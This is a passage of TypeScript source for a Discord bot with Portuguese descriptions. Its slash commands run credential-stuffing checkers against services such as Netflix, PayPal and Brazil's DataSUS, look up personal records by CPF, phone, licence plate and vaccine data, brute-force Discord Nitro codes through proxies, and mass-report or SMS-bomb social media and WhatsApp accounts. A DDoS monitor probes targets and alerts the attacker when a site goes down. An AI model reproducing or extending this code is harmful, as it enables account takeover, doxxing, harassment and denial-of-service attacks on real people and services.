        .setDescription("➕ Promover usuário a owner (acesso total) — apenas bootstrap owner")
        .addUserOption(opt => opt.setName("user").setDescription("Usuário a promover").setRequired(true))
    )
    .addSubcommand(sub =>
      sub.setName("add-admin")
        .setDescription("➕ Adicionar admin autorizado — owner only")
        .addUserOption(opt => opt.setName("user").setDescription("Usuário a adicionar como admin").setRequired(true))
    )
    .addSubcommand(sub =>
      sub.setName("remove")
        .setDescription("➖ Remover owner ou admin — owner only")
        .addUserOption(opt => opt.setName("user").setDescription("Usuário a remover").setRequired(true))
    ),

  new SlashCommandBuilder()
    .setName("checker")
    .setDescription("🔑 Checker de credenciais — iSeek.pro ou DataSUS (SI-PNI)")
    .addSubcommand(sub =>
      sub.setName("single")
        .setDescription("🔑 Verificar uma credencial (formato: login:senha ou email:senha)")
        .addStringOption(opt =>
          opt.setName("credencial")
            .setDescription("No formato login:senha — ex: user@gmail.com:123456")
            .setRequired(true)
            .setMaxLength(500)
        )
    )
    .addSubcommand(sub =>
      sub.setName("multi")
        .setDescription("📋 Verificar múltiplas credenciais (separadas por vírgula, ponto-e-vírgula ou linha)")
        .addStringOption(opt =>
          opt.setName("lista")
            .setDescription("Ex: user1@gmail.com:123,user2@gmail.com:456 — aceita qualquer separador")
            .setRequired(true)
            .setMaxLength(4000)
        )
    )
    .addSubcommand(sub =>
      sub.setName("arquivo")
        .setDescription("📁 Enviar arquivo .txt com credenciais (uma por linha: login:senha) — sem limite de linhas")
        .addAttachmentOption(opt =>
          opt.setName("arquivo")
            .setDescription("Arquivo .txt com login:senha por linha")
            .setRequired(true)
        )
    ),

  new SlashCommandBuilder()
    .setName("consulta")
    .setDescription("🔍 Consultar registros do banco de dados por nome, prontuário ou CPF")
    .addSubcommand(sub =>
      sub.setName("buscar")
        .setDescription("🔎 Busca inteligente — nome, prontuário ou CPF")
        .addStringOption(opt =>
          opt.setName("query")
            .setDescription("Nome, número de prontuário ou CPF para buscar")
            .setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("nome")
        .setDescription("👤 Buscar por nome (parcial)")
        .addStringOption(opt =>
          opt.setName("nome")
            .setDescription("Nome ou parte do nome")
            .setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("prontuario")
        .setDescription("🆔 Buscar por número de prontuário (exato)")
        .addStringOption(opt =>
          opt.setName("id")
            .setDescription("Número do prontuário")
            .setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("stats")
        .setDescription("📊 Estatísticas gerais do banco de dados")
    ),

  // ── /url ──────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("url")
    .setDescription("🔐 Busca credenciais do banco por domínio e inicia checker automático")
    .addStringOption(opt =>
      opt.setName("domain")
        .setDescription("Domínio para buscar (ex: gmail.com, netflix.com)")
        .setRequired(true)
    )
    .addStringOption(opt =>
      opt.setName("target")
        .setDescription("Alvo do checker (default: iseek)")
        .setRequired(false)
        .addChoices(
          { name: "iSeek",        value: "iseek"        },
          { name: "Netflix",      value: "netflix"      },
          { name: "Crunchyroll",  value: "crunchyroll"  },
          { name: "Spotify",      value: "spotify"      },
          { name: "GitHub",       value: "github"       },
          { name: "Instagram",    value: "instagram"    },
          { name: "Steam",        value: "steam"        },
          { name: "Roblox",       value: "roblox"       },
          { name: "Serasa",       value: "serasa"       },
          { name: "SERPRO",       value: "serpro"       },
          { name: "PayPal",       value: "paypal"       },
          { name: "Amazon",       value: "amazon"       },
          { name: "Disney+",      value: "disney"       },
          { name: "HBO Max",      value: "hbomax"       },
        )
    ),

  // ── /cpf ──────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("cpf")
    .setDescription("🪪 Consulta de CPF — nome, nascimento, mãe, renda e mais")
    .addStringOption(opt =>
      opt.setName("cpf")
        .setDescription("CPF (somente números ou formatado: 000.000.000-00)")
        .setRequired(true)
    ),

  // ── /osint ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("osint")
    .setDescription("🕵️ Consulta OSINT — CPF, placa, telefone, nome, email, PIX, CNPJ e mais")
    .addStringOption(opt =>
      opt.setName("tipo")
        .setDescription("Tipo de consulta")
        .setRequired(true)
        .addChoices(
          { name: "🪪 CPF",           value: "cpf"      },
          { name: "👤 Nome",           value: "nome"     },
          { name: "📱 Telefone",       value: "telefone" },
          { name: "🚗 Placa",          value: "placa"    },
          { name: "📍 CEP",            value: "cep"      },
          { name: "🏢 CNPJ",           value: "cnpj"     },
          { name: "📧 Email",          value: "email"    },
          { name: "💰 Chave PIX",      value: "pix"      },
          { name: "🚙 CNH",            value: "cnh"      },
          { name: "🪪 RG",             value: "rg"       },
          { name: "🔢 RENAVAM",        value: "renavam"  },
          { name: "⚙️ Chassi",         value: "chassi"   },
          { name: "👨 Nome do Pai",    value: "pai"      },
          { name: "👩 Nome da Mãe",    value: "mae"      },
          { name: "📸 Foto CNH (BR)",  value: "foto"     },
          { name: "💉 SIPNI (Vacinas)", value: "sipni"   },
        )
    )
    .addStringOption(opt =>
      opt.setName("dado")
        .setDescription("Valor para consultar (CPF, placa, nome, telefone…)")
        .setRequired(true)
    ),

  // ── /voice ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("voice")
    .setDescription("🔊 Voice channel control + network sniffer — admin only")
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    .addSubcommand(sub =>
      sub.setName("join")
        .setDescription("🔊 Bot entra no canal de voz que você está")
    )
    .addSubcommand(sub =>
      sub.setName("leave")
        .setDescription("🔇 Bot sai do canal de voz atual e para o sniff")
    )
    .addSubcommand(sub =>
      sub.setName("sniff")
        .setDescription("📡 Monitor de tráfego RTP/UDP em tempo real — Discord Wireshark")
    ),

  // ── /nitro ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("nitro")
    .setDescription("🎁 Discord Nitro Gift Code Generator & Checker — background infinito via proxy pool")
    .addSubcommand(sub =>
      sub.setName("gen")
        .setDescription("⚡ Gerador INFINITO — roda em background mesmo saindo do Discord, stop via botão")
        .addIntegerOption(opt =>
          opt.setName("batch")
            .setDescription("Códigos por ciclo (10–100, padrão: 20)")
            .setRequired(false)
            .setMinValue(10)
            .setMaxValue(100)
        )
        .addStringOption(opt =>
          opt.setName("type")
            .setDescription("Tipo de código (padrão: ambos)")
            .setRequired(false)
            .addChoices(
              { name: "🎮 Classic (16 chars)", value: "classic" },
              { name: "💎 Boost (24 chars)",   value: "boost"   },
              { name: "🔀 Ambos",               value: "both"    },
            )
        )
    )
    .addSubcommand(sub =>
      sub.setName("oneshot")
        .setDescription("🎯 Gerar e checar N códigos de uma vez (1–500)")
        .addIntegerOption(opt =>
          opt.setName("amount")
            .setDescription("Quantidade de códigos (1–500, padrão: 50)")
            .setRequired(false)
            .setMinValue(1)
            .setMaxValue(500)
        )
        .addStringOption(opt =>
          opt.setName("type")
            .setDescription("Tipo de código (padrão: ambos)")
            .setRequired(false)
            .addChoices(
              { name: "🎮 Classic (16 chars)", value: "classic" },
              { name: "💎 Boost (24 chars)",   value: "boost"   },
              { name: "🔀 Ambos",               value: "both"    },
            )
        )
    )
    .addSubcommand(sub =>
      sub.setName("check")
        .setDescription("🔍 Verificar se um código Nitro específico é válido")
        .addStringOption(opt =>
          opt.setName("code")
            .setDescription("O código Nitro para verificar (ex: abc123def456ghij)")
            .setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("stats")
        .setDescription("📊 Ver histórico de sessões de geração — hits, total checado, usuário")
        .addUserOption(opt =>
          opt.setName("user")
            .setDescription("Filtrar por usuário (padrão: você mesmo)")
            .setRequired(false)
        )
    ),

  // ── /sky ──────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("sky")
    .setDescription("🛰️ SKYNETchat — IA alternativa via skynetchat.net (requer SKYNETCHAT_COOKIE)")
    .addSubcommand(sub =>
      sub.setName("ask")
        .setDescription("💬 Enviar uma mensagem ao SKYNETchat")
        .addStringOption(opt =>
          opt.setName("message")
            .setDescription("Sua mensagem / pergunta")
            .setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("model")
            .setDescription("Endpoint / modelo a usar (padrão: chat-V3)")
            .setRequired(false)
            .addChoices(
              { name: "⚡ chat-V3 (padrão)",         value: "chat-V3"          },
              { name: "🚀 chat-V2-fast (rápido)",     value: "chat-V2-fast"     },
              { name: "🧠 chat-V2-thinking",          value: "chat-V2-thinking" },
              { name: "🔭 chat-V3-thinking (lento)",  value: "chat-V3-thinking" },
            )
        )
    )
    .addSubcommand(sub =>
      sub.setName("status")
        .setDescription("🔍 Verificar se SKYNETCHAT_COOKIE está configurado e testar conexão")
    )
    .addSubcommand(sub =>
      sub.setName("add-account")
        .setDescription("➕ Adicionar conta ao pool (nid + sid do cookie do navegador)")
        .addStringOption(opt =>
          opt.setName("nid")
            .setDescription("Valor do cookie 'nid' do skynetchat.net")
            .setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("sid")
            .setDescription("Valor do cookie 'sid' do skynetchat.net")
            .setRequired(true)
        )
    ),

  new SlashCommandBuilder()
    .setName("historico")
    .setDescription("📜 Ver TXT do último check de credenciais (anterior)"),

  // ── /reportredes ──────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("reportredes")
    .setDescription("📢 Report Redes Sociais — mass report em Instagram e TikTok")
    .addStringOption(opt =>
      opt.setName("alvo")
        .setDescription("URL ou @username da conta (ex: https://instagram.com/fulano ou @fulano)")
        .setRequired(true)
    )
    .addIntegerOption(opt =>
      opt.setName("quantidade")
        .setDescription("Quantos reports enviar (1–50, padrão: 10)")
        .setRequired(false)
        .setMinValue(1)
        .setMaxValue(50)
    ),

  // ── /reportwa ─────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("reportwa")
    .setDescription("🚩 Report WhatsApp — enviar reports de abuso e disparar código de verificação")
    .addSubcommand(sub =>
      sub.setName("report")
        .setDescription("🚩 Enviar reports de abuso para um número WhatsApp (paralelo, motivos rotativos)")
        .addStringOption(opt =>
          opt.setName("numero")
            .setDescription("Número alvo com DDI e DDD (ex: 5511999887766)")
            .setRequired(true)
        )
        .addIntegerOption(opt =>
          opt.setName("quantidade")
            .setDescription("Quantidade de reports a enviar (1–200, padrão: 10)")
            .setRequired(false)
            .setMinValue(1)
            .setMaxValue(200)
        )
    )
    .addSubcommand(sub =>
      sub.setName("codigo")
        .setDescription("📲 Disparar código de verificação SMS para um número")
        .addStringOption(opt =>
          opt.setName("numero")
            .setDescription("Número alvo com DDI e DDD (ex: 5511999887766)")
            .setRequired(true)
        )
    ),

].map(c => c.toJSON());

// ── Deploy slash commands ─────────────────────────────────────────────────────
async function deployCommands(): Promise<void> {
  const rest = new REST().setToken(BOT_TOKEN);

  // Try per-guild registration (instant propagation).
  // Each guild is attempted independently so one failure does not block the others.
  let anyGuildOk = false;
  for (const gid of ALL_GUILD_IDS) {
    try {
      await rest.put(Routes.applicationGuildCommands(APPLICATION_ID, gid), { body: COMMANDS });
      console.log(`✅ Registered ${COMMANDS.length} commands to guild ${gid}.`);
      anyGuildOk = true;
    } catch (err) {
      console.warn(`⚠️ Guild ${gid} registration failed (bot may have been removed): ${(err as Error).message}`);
    }
  }

  if (anyGuildOk) {
    // At least one guild succeeded — wipe global to avoid duplicate UI entries.
    try {
      await rest.put(Routes.applicationCommands(APPLICATION_ID), { body: [] });
      console.log("🧹 Cleared global commands (guild-scoped commands are active).");
    } catch { /* non-critical */ }
  } else {
    // No guild registration succeeded — register globally as fallback (takes ~1h to propagate).
    try {
      await rest.put(Routes.applicationCommands(APPLICATION_ID), { body: COMMANDS });
      console.log(`✅ Registered ${COMMANDS.length} commands globally (fallback — ~1h to propagate).`);
    } catch (err) {
      console.warn("⚠️ Global registration also failed:", (err as Error).message);
    }
  }
}

// ── Target probe helper ───────────────────────────────────────────────────────
// Single HTTP probe: HEAD first, falls back to GET if HEAD is refused/blocked.
// Returns statusCode so the UI can display it.
async function singleProbe(url: string, timeoutMs = 5000): Promise<ProbeResult> {
  const t0   = Date.now();
  const ctrl = new AbortController();
  const tid  = setTimeout(() => ctrl.abort(), timeoutMs);
  const hdrs = {
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control":   "no-cache, no-store",
    "Pragma":          "no-cache",
  };
  try {
    // Use HEAD to avoid downloading the response body — much faster under attack load
    let res = await fetch(url, { method: "HEAD", redirect: "follow", signal: ctrl.signal, headers: hdrs });

    // Some servers return 405 (Method Not Allowed) for HEAD — fall back to GET
    if (res.status === 405) {
      const ctrl2 = new AbortController();
      const tid2  = setTimeout(() => ctrl2.abort(), timeoutMs);
      res = await fetch(url, { method: "GET", redirect: "follow", signal: ctrl2.signal, headers: hdrs });
      clearTimeout(tid2);
    }

    clearTimeout(tid);
    const latencyMs  = Date.now() - t0;
    const statusCode = res.status;

    if (statusCode >= 500) {
      return { up: false, latencyMs, statusCode, reason: `HTTP ${statusCode} — origin server error / crash` };
    }
    if (statusCode === 429) {
      return { up: true, latencyMs: latencyMs + 5000, statusCode, reason: `HTTP 429 — rate limiter hit (server alive, fighting back)` };
    }
    if (statusCode === 503) {
      return { up: false, latencyMs, statusCode, reason: `HTTP 503 — service unavailable (overloaded or crashed)` };
    }
    if (statusCode === 502 || statusCode === 504) {
      return { up: false, latencyMs, statusCode, reason: `HTTP ${statusCode} — gateway/proxy error (backend down)` };
    }
    // 4xx are "alive but rejecting" — site is UP
    return { up: true, latencyMs, statusCode };
  } catch (err: unknown) {
    clearTimeout(tid);
    const latencyMs = Date.now() - t0;
    const msg = err instanceof Error ? err.message : String(err);

    if (msg.includes("ECONNREFUSED") || msg.includes("refused")) {
      return { up: false, latencyMs, statusCode: null, reason: "Connection refused — server process crashed" };
    }
    if (msg.includes("ENOTFOUND") || msg.includes("NXDOMAIN")) {
      return { up: false, latencyMs, statusCode: null, reason: "DNS resolution failed — target unreachable" };
    }
    if (msg.includes("ECONNRESET") || msg.includes("reset")) {
      return { up: true, latencyMs: 4500, statusCode: null, reason: "Connection reset — possible TCP overflow" };
    }
    if (msg.includes("abort") || msg.includes("AbortError") || msg.includes("The operation was aborted")) {
      return { up: true, latencyMs: 5100, statusCode: null, reason: "Probe timed out — target slow or pipes saturated" };
    }
    return { up: true, latencyMs: 5500, statusCode: null, reason: "Probe inconclusive — outbound network under load" };
  }
}

// Multi-probe: fire 2 quick independent probes and pick the WORST result.
// This dramatically reduces false positives from transient network blips.
// "Worst" = most informative: prefer confirmed-down over timeout, timeout over UP.
async function probeTarget(rawUrl: string): Promise<ProbeResult> {
  let url = rawUrl.trim();
  if (!/^https?:\/\//i.test(url)) url = `https://${url}`;

  // Two parallel probes with staggered timeouts (4.5s + 5s)
  const [p1, p2] = await Promise.all([
    singleProbe(url, 4500).catch(() => ({ up: true, latencyMs: 5500, statusCode: null, reason: "Probe inconclusive" } as ProbeResult)),
    singleProbe(url, 5000).catch(() => ({ up: true, latencyMs: 5500, statusCode: null, reason: "Probe inconclusive" } as ProbeResult)),
  ]);

  // If either probe is definitively DOWN (5xx / refused), use that result
  const def1 = !p1.up && (p1.reason?.includes("refused") || p1.reason?.includes("HTTP 5") || p1.reason?.includes("crash") || p1.reason?.includes("503") || p1.reason?.includes("502") || p1.reason?.includes("504"));
  const def2 = !p2.up && (p2.reason?.includes("refused") || p2.reason?.includes("HTTP 5") || p2.reason?.includes("crash") || p2.reason?.includes("503") || p2.reason?.includes("502") || p2.reason?.includes("504"));

  if (def1) return p1;
  if (def2) return p2;

  // Both timed out / inconclusive — try via the API server's proxy pool as tiebreaker.
  // If both direct probes are inconclusive, the target may be blocking Replit datacenter IPs.
  // The proxied probe distinguishes "target down" from "Replit IP blocked by target CDN".
  if (!p1.up && !p2.up) {
    const proxied = await apiProbe(url).catch(() => null);
    if (proxied && proxied.statusCode !== null) {
      const up = proxied.statusCode > 0 && proxied.statusCode < 500 && proxied.statusCode !== 503;
      return { up, latencyMs: proxied.latencyMs, statusCode: proxied.statusCode, reason: proxied.up ? `Proxy probe: HTTP ${proxied.statusCode} via ${proxied.via}` : `Proxy probe: HTTP ${proxied.statusCode} — origin error` };
    }
    return p1.latencyMs >= p2.latencyMs ? p1 : p2;
  }
  if (!p1.up) return p2; // p2 is UP — use it (p1 was a blip)
  if (!p2.up) return p1; // p1 is UP — use it (p2 was a blip)

  // Both UP — return worst (highest) latency to not mask real degradation
  return p1.latencyMs >= p2.latencyMs ? p1 : p2;
}

// ── Live attack monitor ───────────────────────────────────────────────────────
const monitors        = new Map<number, NodeJS.Timeout>();
const prevPackets     = new Map<number, number>();
const targetHistories = new Map<number, ProbeResult[]>();
const downAlertSent   = new Map<number, boolean>(); // prevent DM spam

// Module-level client ref (set in main()) for DM support
let botClient: Client | null = null;

// ── Nitro history — in-memory, persisted to disk ──────────────────────────────
interface NitroSession {
  id:          string;
  userId:      string;
  username:    string;
  guildId:     string | null;
  timestamp:   number;
  amount:      number;
  codeType:    string;
  valid:       number;
  invalid:     number;
  rateLimited: number;
  errors:      number;
  hitCodes:    { code: string; plan: string }[];
  durationMs:  number;
  proxyCount:  number;
}

const NITRO_HISTORY_FILE = path.join(process.cwd(), "data", "nitro-history.json");
let nitroHistory: NitroSession[] = [];

function loadNitroHistory(): void {
  try {
    const raw = fs.readFileSync(NITRO_HISTORY_FILE, "utf8");
    const parsed = JSON.parse(raw) as NitroSession[];
    if (Array.isArray(parsed)) nitroHistory = parsed.slice(-500); // keep last 500 sessions
  } catch { /* no history yet */ }
}

function saveNitroHistory(): void {
  try {
    fs.mkdirSync(path.dirname(NITRO_HISTORY_FILE), { recursive: true });
    fs.writeFileSync(NITRO_HISTORY_FILE, JSON.stringify(nitroHistory.slice(-500), null, 2));
  } catch { /* non-fatal */ }
}

function pushNitroSession(session: NitroSession): void {
  nitroHistory.push(session);
  if (nitroHistory.length > 500) nitroHistory = nitroHistory.slice(-500);
  saveNitroHistory();
}

loadNitroHistory();

// ── Active background generators — one per channel ───────────────────────────
interface NitroGenerator {
  loopHandle:  NodeJS.Timeout | null;  // null while a batch is in-progress
  running:     boolean;
  channelId:   string;
  guildId:     string | null;
  messageId:   string;
  userId:      string;
  username:    string;
  batchSize:   number;
  codeType:    "classic" | "boost" | "both";
  stats: {
    total:      number;
    valid:      number;
    invalid:    number;
    rateLimited: number;
    errors:     number;
    batches:    number;
    startTime:  number;
    lastBatchAt: number;
    hits:       { code: string; plan: string; at: number }[];
  };
}
const activeGenerators = new Map<string, NitroGenerator>(); // key: channelId

// ═══════════════════════════════════════════════════════════════════════════
// PAGINATION HELPER — Arrow-button embed pager (5 min TTL)
// ═══════════════════════════════════════════════════════════════════════════
async function sendPaginated(
  interaction: ChatInputCommandInteraction,
  pages: EmbedBuilder[],
  options: { timeoutMs?: number; ephemeral?: boolean } = {},
): Promise<void> {
  const { timeoutMs = 300_000, ephemeral = false } = options;
  if (pages.length === 0) return;
  if (pages.length === 1) {
    await interaction.editReply({ embeds: [pages[0]], components: [] });
    return;
  }

  let page = 0;

  const buildRow = (disabled = false) => new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId("pg_first")
      .setLabel("⏮️")
      .setStyle(ButtonStyle.Secondary)
      .setDisabled(disabled || page === 0),
    new ButtonBuilder()
      .setCustomId("pg_prev")
      .setLabel("◀️")
      .setStyle(ButtonStyle.Primary)
      .setDisabled(disabled || page === 0),
    new ButtonBuilder()
      .setCustomId("pg_indicator")
      .setLabel(`${page + 1} / ${pages.length}`)
      .setStyle(ButtonStyle.Secondary)
      .setDisabled(true),
    new ButtonBuilder()
      .setCustomId("pg_next")
      .setLabel("▶️")
      .setStyle(ButtonStyle.Primary)
      .setDisabled(disabled || page === pages.length - 1),
    new ButtonBuilder()
      .setCustomId("pg_last")
      .setLabel("⏭️")
      .setStyle(ButtonStyle.Secondary)
      .setDisabled(disabled || page === pages.length - 1),
  );

  const msg = await interaction.editReply({
    embeds: [pages[page]],
    components: [buildRow()],
  });

  const collector = msg.createMessageComponentCollector({
    componentType: ComponentType.Button,
    filter: (btn) => btn.user.id === interaction.user.id && btn.customId.startsWith("pg_"),
    time: timeoutMs,
  });

  collector.on("collect", async (btn) => {
    if (btn.customId === "pg_first")     page = 0;
    else if (btn.customId === "pg_prev") page = Math.max(0, page - 1);
    else if (btn.customId === "pg_next") page = Math.min(pages.length - 1, page + 1);
    else if (btn.customId === "pg_last") page = pages.length - 1;

    await btn.update({
      embeds: [pages[page]],
      components: [buildRow()],
    });
  });

  collector.on("end", async () => {
    try {
      await interaction.editReply({ components: [buildRow(true)] });
    } catch { /* expired */ }
  });
}

function buildAttackButtons(attackId: number, running: boolean): ActionRowBuilder<ButtonBuilder> {
  return new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`stop_${attackId}`)
      .setLabel("⏹️ Stop Attack")
      .setStyle(ButtonStyle.Danger)
      .setDisabled(!running),
    new ButtonBuilder()
      .setCustomId(`extend_${attackId}`)
      .setLabel("⏱️ Extend +60s")
      .setStyle(ButtonStyle.Primary)
      .setDisabled(!running),
  );
}

function startMonitor(attackId: number, initialEditFn: MonitorEditFn, target: string, userId?: string, channelId?: string): void {
  if (monitors.has(attackId)) return;

  // MAX 5 concurrent monitors — prevents Discord request queue saturation that causes
  // "The application did not respond" errors on unrelated commands (e.g. /hydra ask)
  if (monitors.size >= 5) {
    console.warn(`[MONITOR] Max concurrent monitors (5) reached — skipping monitor for #${attackId}`);
    return;
  }

  const INTERVAL_MS     = 8_000; // 8s — live metrics update frequency (reduced to prevent Discord REST queue saturation)
  const MAX_LIFETIME_MS = 70 * 60 * 1000; // 70 min — force-kill monitor after max attack duration
  const startedAt       = Date.now();

  // PPS history for trend arrows (↑↓→) — last 6 samples = 30s of trend data
  const ppsHistory: number[] = [];

  // Proxy count fetched once at monitor start — used in embed badge
  let proxyCount = 0;
  void api.getProxyStats().then(s => { proxyCount = s?.count ?? 0; }).catch(() => {});

  targetHistories.set(attackId, []);
  downAlertSent.set(attackId, false);
  let busy = false;
  let nullConsecutive   = 0; // consecutive null API responses
  let discordFailCount  = 0; // consecutive Discord edit failures

  // Mutable editFn — swapped to channel.send/edit when interaction token expires
  let editFn: MonitorEditFn = initialEditFn;
  let channelFallbackMsg: import("discord.js").Message | null = null;

  const stopMonitor = () => {
    clearInterval(tick);
    monitors.delete(attackId);
    prevPackets.delete(attackId);
    targetHistories.delete(attackId);
    downAlertSent.delete(attackId);
  };

  const tick = setInterval(async () => {
    if (busy) return;
    busy = true;
    try {
      // Force-kill stale monitors that outlive the longest possible attack
      if (Date.now() - startedAt > MAX_LIFETIME_MS) {
        console.log(`[MONITOR #${attackId}] Max lifetime reached — stopping.`);
        stopMonitor();
        return;
      }

      const [attack, live, probe] = await Promise.all([
        api.getAttack(attackId),
        api.getLiveConns(attackId),
        probeTarget(target).catch(() => ({ up: true, latencyMs: 5500, reason: "Probe inconclusive — outbound network under load" } as ProbeResult)),
      ]);

      // Stop if: 8 consecutive nulls (API truly unavailable — transient timeouts are normal under attack load)
      // 8 × 8s = 64s window before giving up — gives the server time to recover from DB spikes
      if (!attack) {
        nullConsecutive++;
        if (nullConsecutive >= 8) {
          console.log(`[MONITOR #${attackId}] Stopping — nullConsec=${nullConsecutive}`);
          stopMonitor();
        }
        return;
      }
      nullConsecutive = 0; // reset on success

      const history = targetHistories.get(attackId) ?? [];
      history.push(probe);
      if (history.length > 30) history.shift();
      targetHistories.set(attackId, history);

      // Use in-memory live pps from the /live endpoint (no DB lag)
      // Fallback to delta calculation if live.pps is unavailable
      const livePps = live.pps > 0
        ? live.pps
        : (() => {
            const prev  = prevPackets.get(attackId) ?? attack.packetsSent;
            const delta = Math.max(0, attack.packetsSent - prev);
            prevPackets.set(attackId, attack.packetsSent);
            return Math.round(delta / (INTERVAL_MS / 1000));
          })();
      if (live.pps > 0) prevPackets.set(attackId, attack.packetsSent);

      // Track PPS history for trend arrows — keep last 6 samples (30s window)
      ppsHistory.push(livePps);
      if (ppsHistory.length > 6) ppsHistory.shift();

      const liveBps   = live.bps ?? 0;
      const isRunning = attack.status === "running";
      const row       = buildAttackButtons(attackId, isRunning);

      try {
        await editFn({
          embeds:     [buildAttackEmbed(attack, livePps, liveBps, live?.conns ?? 0, history, ppsHistory, proxyCount)],
          components: [row],
        });
        discordFailCount = 0; // reset on success
      } catch (editErr) {
        discordFailCount++;
        const errMsg = (editErr instanceof Error) ? editErr.message : String(editErr);
        console.warn(`[MONITOR #${attackId}] embed edit failed (${discordFailCount}x):`, errMsg);
        // Token expiry (Unknown Interaction=10062, Unknown Message=10008, Unknown Webhook=10015)
        // → Switch to channel fallback instead of stopping. Sends a fresh message to the channel
        //   and re-uses it for the rest of the attack duration.
        const isTokenExpired = /10062|10008|10015|Unknown Interaction|Unknown Message|Unknown Webhook/i.test(errMsg);
        if (isTokenExpired && channelId && botClient && !channelFallbackMsg) {
          console.log(`[MONITOR #${attackId}] Token expired — switching to channel fallback message...`);
          try {
            const ch = await botClient.channels.fetch(channelId);
            if (ch && ch.isTextBased() && "send" in ch) {
              channelFallbackMsg = await (ch as import("discord.js").TextChannel).send({
                content: userId ? `<@${userId}> ⚔️ **Ataque #${attackId}** em andamento — monitor ativo` : `⚔️ **Ataque #${attackId}** em andamento`,
                embeds: [buildAttackEmbed(attack, livePps, liveBps, live?.conns ?? 0, history, ppsHistory, proxyCount)],
                components: [row],
              });
              editFn = async (opts) => { await channelFallbackMsg!.edit(opts); };
              discordFailCount = 0;
              return;
            }
          } catch (fallbackErr) {
            console.warn(`[MONITOR #${attackId}] Channel fallback failed:`, fallbackErr instanceof Error ? fallbackErr.message : fallbackErr);
          }
          stopMonitor();
          return;
        }
        if (isTokenExpired) {
          // No channelId available or already has fallback msg — stop
          console.log(`[MONITOR #${attackId}] Token expired, no channel fallback — stopping.`);
          stopMonitor();
          return;
        }
        // Stop after 10 consecutive non-token failures (message deleted, rate limit, etc.)
        if (discordFailCount >= 10) {
          console.log(`[MONITOR #${attackId}] Stopping — Discord edit failed ${discordFailCount} times consecutively.`);
          stopMonitor();
          return;
        }
      }

      // ── DM alert when target goes definitively DOWN ─────────────────────
      const isDefinitivelyDown = !probe.up && (
        probe.reason?.includes("refused") ||
        probe.reason?.includes("HTTP 5") ||
        probe.reason?.includes("crash") ||
        probe.reason?.includes("503") ||
        probe.reason?.includes("502") ||
        probe.reason?.includes("504")
      );
      if (userId && botClient && !downAlertSent.get(attackId) && isDefinitivelyDown) {
        downAlertSent.set(attackId, true);
        // Persist efficacy data to DB in background (non-blocking)
        void api.markTargetDown(attackId);
        try {
          const user = await botClient.users.fetch(userId);
          await user.send({
            embeds: [
              new EmbedBuilder()
                .setColor(COLORS.RED)
                .setTitle("💀 TARGET CONFIRMED DOWN")
                .setDescription(
                  `> *"All opposition shall submit to the might of Geass."*\n\n` +
                  `\`${target}\` · ${METHOD_EMOJIS[attack.method] ?? "⚡"} **${attack.method}** · \`#${attackId}\`\n` +
                  `💀 **${probe.reason ?? "ECONNREFUSED"}**`
                )
                .setFooter({ text: AUTHOR })
                .setTimestamp(),
            ],
          });
        } catch { /* DM may be blocked by user privacy settings */ }
      }

      if (!isRunning) {
        // Send finish notification to the channel where attack was launched
        if (channelId && botClient) {
          try {
            const ch = await botClient.channels.fetch(channelId);
            if (ch && ch.isTextBased() && "send" in ch) {
              await ch.send({
                content: userId ? `<@${userId}>` : undefined,
                embeds: [buildFinishEmbed(attack.id, attack.target, attack.method, attack.status, attack.packetsSent, attack.bytesSent, attack.startedAt, attack.stoppedAt)],
              });
            }
          } catch (notifyErr) {
            console.warn(`[MONITOR #${attackId}] notify failed:`, notifyErr instanceof Error ? notifyErr.message : notifyErr);
          }
        }
        stopMonitor();
      }
    } catch (monitorErr) {
      // Swallow monitor errors — API timeouts / DB flaps must NOT bubble up as
      // unhandled rejections that could saturate the event loop or crash the bot.
      console.warn(`[MONITOR #${attackId}] tick error (non-fatal):`, monitorErr instanceof Error ? monitorErr.message : monitorErr);
    } finally { busy = false; }
  }, INTERVAL_MS);
  monitors.set(attackId, tick);
}

// ── Build launcher embed with all dropdowns ────────────────────────────────────
// Discord hard-limit: 25 options per select menu, 5 rows per message.
// VIP:  Row1 = methods 1-25, Row2 = methods 26-50, Row3 = duration, Row4 = threads, Row5 = buttons
// Free: Row1 = 7 free methods only,               Row2 = duration, Row3 = threads, Row4 = buttons
const METHOD_OPTIONS_A     = METHOD_OPTIONS.slice(0, 25); // Hydra + L7 + L4 (≤25)
const METHOD_OPTIONS_B     = METHOD_OPTIONS.slice(25);    // ARES OMNIVECT ∞  (≤25)
const FREE_METHOD_OPTIONS  = METHOD_OPTIONS.filter(m => FREE_METHODS.has(m.value));

const FREE_DURATION_OPTIONS = DURATION_OPTIONS.filter(d => parseInt(d.value, 10) <= MAX_DURATION_FREE);
const FREE_THREAD_OPTIONS   = THREAD_OPTIONS.filter(t => parseInt(t.value, 10) <= MAX_POWER_FREE);

function buildLauncherComponents(
  _target:         string,
  isVip            = false,
  selectedMethod?: string,
  selectedDuration = "60",
  selectedThreads  = "4",
): ActionRowBuilder<StringSelectMenuBuilder>[] {
  const mkMethodOpt = (m: typeof METHOD_OPTIONS[0]) =>
    new StringSelectMenuOptionBuilder()
      .setValue(m.value)
      .setLabel(m.label)
      .setDescription(m.description.slice(0, 100))
      .setDefault(m.value === selectedMethod);

  const mkDurOpt = (d: typeof DURATION_OPTIONS[0]) =>
    new StringSelectMenuOptionBuilder()
      .setValue(d.value)
      .setLabel(d.label)
      .setDescription(d.description)
